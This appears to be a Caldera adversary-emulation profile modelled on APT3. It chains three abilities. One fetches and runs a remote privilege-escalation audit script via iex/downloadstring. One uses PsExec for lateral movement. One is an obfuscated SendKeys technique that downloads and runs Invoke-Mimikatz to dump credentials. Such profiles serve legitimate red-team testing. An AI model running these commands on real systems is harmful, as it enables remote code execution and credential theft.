adversary_id: custom_adversary_profile__APT_3__APT3_Phase2_Pattern_3__2023-10-19-22_36_18
name: Custom Adversary Profile
description: [['stockpile__discovery', 'atomic__discovery'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__execution', 'atomic__execution']]
atomic_ordering:
- 413fc5fa7ac34f8a42183217d7f3ec90 # ('413fc5fa7ac34f8a42183217d7f3ec90', 'None', 'validate_me') ; {'description': 'PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.', 'tactic': 'discovery', 'technique': {'attack_id': 'T1082', 'name': 'System Information Discovery'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'iex(new-object net.webclient).downloadstring(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1\'); Invoke-SharpUp -command "audit"', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['413fc5fa7ac34f8a42183217d7f3ec90', 'None', 'validate_me'], 'plugin': 'atomic'}
- 716745153b22c35bf39d177e28ce7bf6 # ('716745153b22c35bf39d177e28ce7bf6', 'None', 'None') ; {'description': 'Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'C:\\PSTools\\PsExec.exe \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe', 'payloads': []}}}, 'id__dependence__fact': ['716745153b22c35bf39d177e28ce7bf6', 'None', 'None'], 'plugin': 'atomic'}
- 90c76bd616efee6d7c98dc6c1dcc6e99 # ('90c76bd616efee6d7c98dc6c1dcc6e99', 'None', 'validate_me') ; {'description': 'Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n', 'tactic': 'execution', 'technique': {'attack_id': 'T1059.001', 'name': 'Command and Scripting Interpreter: PowerShell'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr", 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['90c76bd616efee6d7c98dc6c1dcc6e99', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []